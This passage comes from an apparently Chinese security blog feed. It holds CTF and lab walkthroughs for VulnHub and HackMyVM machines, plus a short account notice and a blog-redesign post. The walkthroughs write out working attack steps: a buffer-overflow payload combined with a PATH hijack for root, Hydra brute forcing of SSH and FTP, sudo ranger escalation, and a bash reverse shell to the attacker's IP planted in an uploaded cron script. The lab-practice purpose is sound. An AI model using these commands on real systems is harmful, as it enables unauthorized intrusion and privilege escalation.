listening on [any] 1234 ...

```

靶机推送

```
localhost:/opt$ cat vuln &gt; /dev/tcp/192.168.205.128/1234
-sh: can't create /dev/tcp/192.168.205.128/1234: nonexistent directory
localhost:/opt$ which bash
```

ok，那没事了，拿scp推

```
localhost:/opt$ scp vuln kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
The authenticity of host '192.168.205.128 (192.168.205.128)' can't be established.
ED25519 key fingerprint is SHA256:0EmnEbFZ1K2Otrqlk0b3OHH8M36kr43dnKXNZ9+mcLI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '192.168.205.128' (ED25519) to the list of known hosts.
kali@192.168.205.128's password: 
vuln                                                                                                                                            100%   20KB   8.9MB/s   00:00   
```

拖去ida

```
void __cdecl vuln()
{
  char buffer[32]; // [rsp+0h] [rbp-30h] BYREF
  ssize_t n; // [rsp+20h] [rbp-10h]
  int flag; // [rsp+2Ch] [rbp-4h]

  flag = 0;
  n = read(0, buffer, 0x30uLL);
  if ( flag == 1 )
  {
    secret();
  }
  else
  {
    printf('flag = %d\n', (unsigned int)flag);
    puts('password wrong');
  }
}

void __cdecl secret()
{
  setuid(0);
  system('cat /etc/shadow');
}
```

看来一下，确实是溢出
你想拿shell也可以，玩法挺多

```
localhost:/opt$ id
uid=1000(ldz) gid=1000(ldz) groups=1000(ldz)
localhost:/opt$ tty
/dev/pts/0
localhost:/opt$ cd /home/ldz
localhost:~$ echo '/bin/sh &lt; /dev/pts/0' &gt; cat
localhost:~$ chmod +x cat
localhost:~$ (printf 'A%.0s' $(seq 1 44); printf '\x01\x00\x00\x00') &gt; p
localhost:~$ xxd p
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 0100 0000  AAAAAAAAAAAA....
localhost:~$ export PATH=/home/ldz:$PATH
localhost:~$ cd /opt
localhost:/opt$ ./vuln &lt; /home/ldz/p
/opt # id
uid=0(root) gid=1000(ldz) groups=1000(ldz)
/opt # export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$HOME/bin
/opt # cat /root/root.txt 
flag{98ecb90d5dcef41e1bd18f47697f287a}
```

评价一下这个靶机
![image-20250628094814909](https://7r1umphk.github.io/image/image20250628094815151.webp)

哈哈，没打过的可以期待一手sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_yulian.html</guid><pubDate>Sat, 28 Jun 2025 02:20:14 +0000</pubDate></item><item><title>说点事</title><link>https://7r1UMPHK.github.io/post/shuo-dian-shi.html</link><description>事情经过就是我电脑有问题刷了系统，然后我github和google都开了二步，全部没了，so
7r1umph是我，7r1umphk也是我
以后发布就发在这了，然后hmv和thl平台应该会创一个新号名字是7r1umphk
当然如果旧博客有的wp我不会交了
就说这么多sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/shuo-dian-shi.html</guid><pubDate>Fri, 27 Jun 2025 09:34:16 +0000</pubDate></item><item><title>内部_Qingmei</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Qingmei.html</link><description>## 1. 信息收集

### 1.1 主机发现

使用 `arp-scan` 工具对本地网络 `192.168.205.0/24` 进行扫描，以识别目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l
[sudo] password for kali:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan )
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.218 08:00:27:83:ca:3c       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ed:bd:56       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.974 seconds (129.69 hosts/sec). 4 responded
```

**结果：** 目标主机 IP 地址确认为 `192.168.205.218`。

### 1.2 端口扫描与服务识别

使用 `nmap` 对目标主机 `192.168.205.218` 进行全端口 TCP 扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p- --min-rate 10000 192.168.205.218
Starting Nmap 7.95 ( https://nmap.org  ) at 2025-05-18 22:55 EDT
Nmap scan report for 192.168.205.218
Host is up (0.00028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:83:CA:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
```

进一步对开放端口进行服务版本探测：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p22,80 -sV 192.168.205.218
Starting Nmap 7.95 ( https://nmap.org  ) at 2025-05-19 08:30 EDT
Nmap scan report for 192.168.205.218
Host is up (0.00031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:83:CA:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/  .
Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds
```

**结果：** 目标主机开放了 SSH 服务 (OpenSSH 8.9p1, 端口 22) 和 HTTP 服务 (Apache httpd 2.4.62, 端口 80)。

## 2. 漏洞分析与利用

### 2.1 Web 服务探测

对目标 80 端口的 HTTP 服务进行初步探测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -v http://192.168.205.218
*   Trying 192.168.205.218:80...
* Connected to 192.168.205.218 (192.168.205.218) port 80
* using HTTP/1.x
&gt; GET / HTTP/1.1
&gt; Host: 192.168.205.218
&gt; User-Agent: curl/8.13.0
&gt; Accept: */*
&gt;
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Date: Mon, 19 May 2025 03:11:15 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Last-Modified: Sun, 18 May 2025 13:52:35 GMT
&lt; ETag: '64d-6356953de9708'
&lt; Accept-Ranges: bytes
&lt; Content-Length: 1613
&lt; Vary: Accept-Encoding
&lt; Content-Type: text/html
&lt;
&lt;h1&gt;
&lt;pre&gt;
                                   .     **
                                 *           *.
                                               ,*
                                                  *,
                          ,                         ,*
                       .,                              *,
                     /                                    *
                  ,*                                        *,
                /.                                            .*.
              *                                                  **
              ,*                                               ,*
                 **                                          *.
                    **                                    **.
                      ,*                                **
                         *,                          ,*
                            *                      **
                              *,                .*
                                 *.           **
                                   **      ,*,
                                      ** *,     HackMyVM

   QQ Group:   660930334
   &lt;/h1&gt;
&lt;/pre&gt;
* Connection
```

Web 首页内容为字符画及 QQ 群号，未发现直接可利用信息。

使用 `dirb` 进行目录爆破：

```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.205.218

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun May 18 23:13:00 2025
URL_BASE: http://192.168.205.218/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.205.218/ ----
+ http://192.168.205.218/index.html (CODE:200|SIZE:1613)
+ http://192.168.205.218/server-status (CODE:403|SIZE:280)

-----------------
END_TIME: Sun May 18 23:13:03 2025
DOWNLOADED: 4612 - FOUND: 2
```

**结果：** 目录爆破仅发现 `index.html` 和被禁止访问的 `server-status`。Web 服务方面未找到明显突破口。

### 2.2 SSH 服务探测与初始访问

尝试连接 SSH 服务，观察其 Banner 信息。

```bash
┌──(kali㉿kali)-[~]
└─$ ssh root@192.168.205.218
 ____________
( guest/guest )
 -------------
        o   ^__^
         o  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
root@192.168.205.218's password:
```

**发现：** SSH Banner 泄露了凭据 `guest/guest`。

使用泄露的凭据 `guest:guest` 登录 SSH：

```bash
┌──(kali㉿kali)-[~]
└─$ ssh guest@192.168.205.218
Password: guest
# 成功登录
guest@Qingmei:~$ id
uid=1000(guest) gid=1000(guest) groups=1000(guest)
```

**结果：** 成功以 `guest` 用户身份获得对系统的初始访问权限。

## 3. 权限提升

### 3.1 权限提升：guest -&gt; morri

登录后，对 `guest` 用户进行本地枚举。

#### 3.1.1 家目录检查与 sudo 权限

查看 `guest` 用户家目录内容及 `sudo` 权限：

```bash
guest@Qingmei:~$ ls -la
total 28
drwxr-xr-x 2 guest guest 4096 May 18 22:57 .
drwxr-xr-x 4 root  root  4096 May 18 09:55 ..
-rw-r--r-- 1 root  root   166 May 18 09:55 banner
-rw-r--r-- 1 guest guest  220 May 18 09:54 .bash_logout
-rw-r--r-- 1 guest guest 3543 May 18 09:55 .bashrc
-rw------- 1 guest guest   31 May 18 22:32 .lesshst
-rw-r--r-- 1 guest guest  807 May 18 09:54 .profile

guest@Qingmei:~$ cat banner
 ____________
&lt; Are u ok ? &gt;
 -------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

guest@Qingmei:~$ sudo -l
[sudo] password for guest: guest
Sorry, user guest may not run sudo on Qingmei.
```

**结果：** `guest` 用户无 `sudo` 权限。家目录下的 `banner` 文件内容如上。

#### 3.1.2 SUID 文件检查

```bash
guest@Qingmei:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

**结果：** 未发现非标准的 SUID 可执行文件。

#### 3.1.3 检查 `/opt` 目录

```bash
guest@Qingmei:~$ cd /opt/
guest@Qingmei:/opt$ ls -al
total 32
drwxr-xr-x  2 root root  4096 May 18 10:12 .
drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..
-rw-r--r--  1 root root   169 May 18 09:53 banner.txt
-rwx-----x  1 root root 17024 May 18 10:12 morri_password
```

**发现：** 在 `/opt` 目录下发现一个名为 `morri_password` 的可执行文件，其所有者为 `root`，但 `guest` 用户（属于 `others`）具有执行权限。

尝试执行该程序并查看帮助信息：

```bash
guest@Qingmei:/opt$ ./morri_password
You need to input strings of 'A's with correct lengths (10-50 characters).
You'll be asked to do this 10 times.

Try 1/10: Please input exactly 26 'A's: ^C

guest@Qingmei:/opt$ ./morri_password -h
Usage: ./program [options]
Options:
  -h          Show this help message
  --dashazi   Directly output credentials

Normal operation:
  The program will ask you to input strings of 'A's with random lengths (10-50)
  You need to correctly input 10 times to get the credentials
```

**发现：** 程序存在 `--dashazi` 选项可以直接输出凭据。

#### 3.1.4 获取 `morri` 用户凭据

使用 `--dashazi` 选项执行程序：

```bash
guest@Qingmei:/opt$ ./morri_password --dashazi
user:morri pass:morri
```

**结果：** 成功获取用户 `morri` 的凭据为 `morri:morri`。

#### 3.1.5 切换至 `morri` 用户并获取 `user.txt`

```bash
guest@Qingmei:/opt$ su morri
Password: morri # 输入密码 morri
morri@Qingmei:/opt$ id
uid=1001(morri) gid=1001(morri) groups=1001(morri)
morri@Qingmei:/opt$ cd ~
morri@Qingmei:~$ cat user.txt
flag{user-edf050af-33ef-11f0-b3f0-000c2955ba04}
```

**结果：** 成功切换到 `morri` 用户并读取 `user.txt`，获取第一个 flag。

### 3.2 权限提升：morri -&gt; root

#### 3.2.1 Sudo 权限检查 (morri)

检查 `morri` 用户的 `sudo` 权限：

```bash
morri@Qingmei:~$ sudo -l
Matching Defaults entries for morri on Qingmei:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User morri may run the following commands on Qingmei:
    (ALL) NOPASSWD: /usr/bin/ranger
```

**发现：** `morri` 用户可以无密码以 `root` 权限执行 `/usr/bin/ranger`。

#### 3.2.2 利用 `ranger` 提权

`ranger` 是一个终端文件管理器，可以通过其内置的 shell 执行功能来获取 `root` shell。

1. 执行 `sudo /usr/bin/ranger`。

   ```bash
   morri@Qingmei:~$ sudo /usr/bin/ranger
   ```

2. 在 `ranger` 界面中，按下 `s` 键 (或 `:`) 进入命令模式。

3. 输入 `bash -p` (或 `sh -p`) 并回车。参数 `-p` 确保 `bash` 以特权模式（effective UID as root）启动。

执行后，成功返回一个 `root` shell。

```bash
# 此处已是 root shell
root@Qingmei:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Qingmei:~# cat /root/root.txt
flag{root-485ee7a8-33f0-11f0-afbc-000c2955ba04}
```

**结果：** 成功获取 `root` 权限并读取 `root.txt`，获取第二个 flag。

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Qingmei.html</guid><pubDate>Fri, 27 Jun 2025 09:34:11 +0000</pubDate></item><item><title>✨ 焕然一新：我的博客界面美化之旅 ✨</title><link>https://7r1UMPHK.github.io/post/%E2%9C%A8%20-huan-ran-yi-xin-%EF%BC%9A-wo-de-bo-ke-jie-mian-mei-hua-zhi-lv-%20%E2%9C%A8.html</link><description>大家好！

最近如果你经常访问我的博客，可能会发现它悄悄地“变脸”了！没错，在过去的一段时间里，我投入了不少精力对博客的前端界面进行了一次比较全面的美化和升级。目的很简单：**提升阅读体验，让它看起来更现代、更舒服！**

这次“美容手术”主要包含以下几个方面：

### 1. 移动端体验大优化 📱

我知道很多朋友习惯用手机浏览，所以移动端的优化是重中之重：

*   **告别错位**：修复了之前手机端首页头像有时会“乱跑”的问题。
*   **导航助手**：为文章页面添加了**浮动目录按钮**和**回到顶部按钮**。现在，即使是长篇大论，也能轻松定位和返回顶部啦！
*   **布局适配**：整体调整了边距、卡片样式和字体大小，使其在小屏幕上显示更加和谐。

### 2. 视觉风格全面革新 🎨

无论是桌面端还是移动端，整体视觉风格都进行了一次升级：

*   **更柔和的观感**：采用了带有透明度和模糊效果的背景与卡片设计（类似毛玻璃效果），增加了页面的层次感。
*   **精致的细节**：优化了圆角、阴影和边框，让元素看起来更加细腻。列表项、标签、按钮等都添加了更平滑的悬停效果和过渡动画。
*   **现代感字体与排版**：微调了字体、行高和段落间距，力求更佳的阅读舒适度。文章标题也更加醒目。

### 3. 性能优化：定制懒加载 🚀

考虑到网站图片基本都使用了 jsDelivr CDN，为了进一步提升加载速度：

*   **懒加载上线**：我编写并部署了一个**定制的图片懒加载脚本**。现在，页面中的图片（除了头像和部分小图标）只有在即将滚动到视口时才会加载，这对于图片较多的文章页面效果尤其明显，可以有效减少初始加载时间。
*   **告别第三方库**：替换掉了之前尝试使用的第三方懒加载库，现在这个功能完全由我们自己掌控，更贴合博客的实际需求。

### 4. 侧边栏信息卡片 📊

如果你在桌面端访问，应该能看到页面左侧（或特定位置）新增了一个**信息统计卡片**，展示了网站运行天数、访问量等数据，增添了一点小小的“仪式感”。

---

这次改动主要涉及大量的 CSS 样式调整和一些 JavaScript 脚本的优化与编写。虽然过程有点繁琐（尤其是调试各种细节😂），但看到最终的效果，感觉还是挺值得的。

**欢迎大家到处点点看，体验一下新界面！** 如果在浏览过程中发现任何显示异常、样式错乱，或者有任何改进建议，请务必通过评论告诉我，我会尽快修复和完善！

感谢大家的关注和支持！sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/%E2%9C%A8%20-huan-ran-yi-xin-%EF%BC%9A-wo-de-bo-ke-jie-mian-mei-hua-zhi-lv-%20%E2%9C%A8.html</guid><pubDate>Fri, 27 Jun 2025 09:34:09 +0000</pubDate></item><item><title>vulnhub_Funbox_ GaoKao</title><link>https://7r1UMPHK.github.io/post/vulnhub_Funbox_%20GaoKao.html</link><description># vulnhub_Funbox: GaoKao

# 0.简介

**靶机**：https://vulnhub.com/entry/funbox-gaokao,707/  
**难度**：绿色  
**目标 IP**：192.168.205.152  
**本机 IP**：192.168.205.128

# 1.扫描

​`nmap`​起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.152
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 17:56 CST
Nmap scan report for 192.168.205.152
Host is up (0.00025s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 48:39:31:22:fb:c2:03:44:a7:4e:c0:fa:b8:ad:2f:96 (RSA)
|   256 70:a7:74:5e:a3:79:60:28:1a:45:4c:ab:5c:e7:87:ad (ECDSA)
|_  256 9c:35:ce:f6:59:66:7f:ae:c4:d1:21:16:d5:aa:56:71 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wellcome to Funbox: Gaokao !
|_http-server-header: Apache/2.4.29 (Ubuntu)
3306/tcp open  mysql   MySQL 5.7.34-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.34_Auto_Generated_Server_Certificate
| Not valid before: 2021-06-05T15:15:30
|_Not valid after:  2031-06-03T15:15:30
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.34-0ubuntu0.18.04.1
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, LongPassword, IgnoreSpaceBeforeParenthesis, LongColumnFlag, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, IgnoreSigpipes, SupportsLoadDataLocal, SupportsCompression, ODBCClient, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: w5w-\x05[lh(@\x08Zp*'=C:\x01\x10
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:84:89:FF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms 192.168.205.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds
                                      
```

Gaokao可能是一个用户

# 2.踩点

```
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.152
Connected to 192.168.205.152.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]
Name (192.168.205.152:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.205.128 !
230-
230-The local time is: Sun Feb 09 09:57:05 2025
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to &lt;sky@funbox9&gt;.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||13045|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 .
drwxr-xr-x   2 ftp      ftp          4096 Jun  5  2021 ..
-rw-r--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg
226 Transfer complete
ftp&gt; mget welcome.msg
mget welcome.msg [anpqy?]? y                                                                                                         
229 Entering Extended Passive Mode (|||48839|)
150 Opening BINARY mode data connection for welcome.msg (169 bytes)
100% |******************************************************************************************|   169        5.55 MiB/s    00:00 ETA
226 Transfer complete
169 bytes received in 00:00 (150.30 KiB/s)
ftp&gt; exit
221 Goodbye.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat welcome.msg 
Welcome, archive user %U@%R !

The local time is: %T

This is an experimental FTP server.  If you have any unusual problems,
please report them via e-mail to &lt;sky@%L&gt;.

                
```

sky可能是一个用户，继续

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.152 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.152
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,md,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10310]
/.                    (Status: 200) [Size: 10310]

```

就一个默认页，页面无隐藏，爆破ssh,ftp（mysql，要是真没有再说）

```
┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.152 -V -I -u -f -e nsr -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 18:01:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10006 login tries (l:2/p:5003), ~157 tries per task
[DATA] attacking ssh://192.168.205.152:22/

```

```
┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P /usr/share/wordlists/q5000.txt ftp://192.168.205.152 -V -I -u -f -e nsr -t 64

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-09 18:01:04
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10006 login tries (l:2/p:5003), ~157 tries per task
[DATA] attacking ftp://192.168.205.152:21/

[21][ftp] host: 192.168.205.152   login: sky   password: thebest
[STATUS] attack finished for 192.168.205.152 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-09 18:02:53

```

ftp有结果，上去看看

```
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.152
Connected to 192.168.205.152.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]
Name (192.168.205.152:kali): sky
331 Password required for sky
Password: 
230 User sky logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||39399|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 sky      sky          4096 Jun  6  2021 .
drwxr-xr-x   5 root     root         4096 Jun  5  2021 ..
-rw-------   1 sky      sky            56 Jun  5  2021 .bash_history
-r--r--r--   1 sky      sky           220 Jun  5  2021 .bash_logout
-r--r--r--   1 sky      sky          3771 Jun  5  2021 .bashrc
-r--r--r--   1 sky      sky           807 Jun  5  2021 .profile
drwxr-----   2 root     root         4096 Jun  5  2021 .ssh
-rwxr-x---   1 sky      sarah          66 Jun  6  2021 user.flag
-rw-------   1 sky      sky          1489 Jun  5  2021 .viminfo
226 Transfer complete
ftp&gt; mget *
mget user.flag [anpqy?]? y
229 Entering Extended Passive Mode (|||51733|)
150 Opening BINARY mode data connection for user.flag (66 bytes)
100% |******************************************************************************************|    66        1.65 MiB/s    00:00 ETA
226 Transfer complete
66 bytes received in 00:00 (41.31 KiB/s)
ftp&gt; exit
221 Goodbye.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat user.flag 
#!/bin/sh
echo 'Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd'
              
```

有个脚本，有点像后台脚本，我们加个shell上去试试

```
┌──(kali㉿kali)-[~/test]
└─$ echo 'bash -i &gt;&amp;/dev/tcp/192.168.205.128/8888 0&gt;&amp;1' &gt;&gt; user.flag
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.152
Connected to 192.168.205.152.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.205.152]
Name (192.168.205.152:kali): sky
331 Password required for sky
Password: 
230 User sky logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||24304|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 sky      sky          4096 Jun  6  2021 .
drwxr-xr-x   5 root     root         4096 Jun  5  2021 ..
-rw-------   1 sky      sky            56 Jun  5  2021 .bash_history
-r--r--r--   1 sky      sky           220 Jun  5  2021 .bash_logout
-r--r--r--   1 sky      sky          3771 Jun  5  2021 .bashrc
-r--r--r--   1 sky      sky           807 Jun  5  2021 .profile
drwxr-----   2 root     root         4096 Jun  5  2021 .ssh
-rwxr-x---   1 sky      sarah          66 Jun  6  2021 user.flag
-rw-------   1 sky      sky          1489 Jun  5  2021 .viminfo
226 Transfer complete
ftp&gt; put user.flag 
local: user.flag remote: user.flag
229 Entering Extended Passive Mode (|||53542|)
150 Opening BINARY mode data connection for user.flag
100% |******************************************************************************************|   111        2.35 MiB/s    00:00 ETA
226 Transfer complete
111 bytes sent in 00:00 (117.56 KiB/s)

```

另外窗口监测

```
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.152] 52670
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ id
id
uid=1002(sarah) gid=1002(sarah) groups=1002(sarah)

```

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```
bash-4.4$ sudo -l
[sudo] password for sarah: 
bash-4.4$ ls -al
total 36
dr-xr-xr-x 4 sarah sarah 4096 Jun  6  2021 .
drwxr-xr-x 5 root  root  4096 Jun  5  2021 ..
-r--r--r-- 1 sarah sarah  220 Jun  5  2021 .bash_logout
-r--r--r-- 1 sarah sarah 3771 Jun  5  2021 .bashrc
dr-x------ 2 sarah sarah 4096 Jun  5  2021 .cache
dr-x------ 3 sarah sarah 4096 Jun  5  2021 .gnupg
-r--r--r-- 1 sarah sarah  807 Jun  5  2021 .profile
-r--rw-r-- 1 sarah sarah   74 Jun  5  2021 .selected_editor
-r-------- 1 sarah sarah 3214 Jun  6  2021 .viminfo
bash-4.4$ cd ..
bash-4.4$ ls -la
total 20
drwxr-xr-x  5 root  root  4096 Jun  5  2021 .
drwxr-xr-x 24 root  root  4096 Jun  5  2021 ..
drwxr-xr-x  4 lucy  lucy  4096 Jun  6  2021 lucy
dr-xr-xr-x  4 sarah sarah 4096 Jun  6  2021 sarah
drwxr-xr-x  3 sky   sky   4096 Jun  6  2021 sky
bash-4.4$ cd lucy/
bash-4.4$ ls -al
total 36
drwxr-xr-x 4 lucy lucy 4096 Jun  6  2021 .
drwxr-xr-x 5 root root 4096 Jun  5  2021 ..
-rw------- 1 lucy lucy  192 Jun  6  2021 .bash_history                                                                               
-rw-r--r-- 1 lucy lucy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 lucy lucy 3771 Apr  4  2018 .bashrc
drwx------ 2 lucy lucy 4096 Jun  5  2021 .cache
drwx------ 3 lucy lucy 4096 Jun  5  2021 .gnupg
-rw-r--r-- 1 lucy lucy  807 Apr  4  2018 .profile
-rw-r--r-- 1 lucy lucy    0 Jun  5  2021 .sudo_as_admin_successful
-rw------- 1 lucy lucy  702 Jun  6  2021 .viminfo
bash-4.4$ cd ..
bash-4.4$ ls -al
total 20
drwxr-xr-x  5 root  root  4096 Jun  5  2021 .
drwxr-xr-x 24 root  root  4096 Jun  5  2021 ..
drwxr-xr-x  4 lucy  lucy  4096 Jun  6  2021 lucy
dr-xr-xr-x  4 sarah sarah 4096 Jun  6  2021 sarah
drwxr-xr-x  3 sky   sky   4096 Jun  6  2021 sky
bash-4.4$ cd sky/
bash-4.4$ ls -al
total 36
drwxr-xr-x 3 sky  sky   4096 Jun  6  2021 .
drwxr-xr-x 5 root root  4096 Jun  5  2021 ..
-rw------- 1 sky  sky     56 Jun  5  2021 .bash_history
-r--r--r-- 1 sky  sky    220 Jun  5  2021 .bash_logout
-r--r--r-- 1 sky  sky   3771 Jun  5  2021 .bashrc
-r--r--r-- 1 sky  sky    807 Jun  5  2021 .profile
drwxr----- 2 root root  4096 Jun  5  2021 .ssh
-rwxr-x--- 1 sky  sarah  111 Feb  9 10:04 user.flag
-rw------- 1 sky  sky   1489 Jun  5  2021 .viminfo
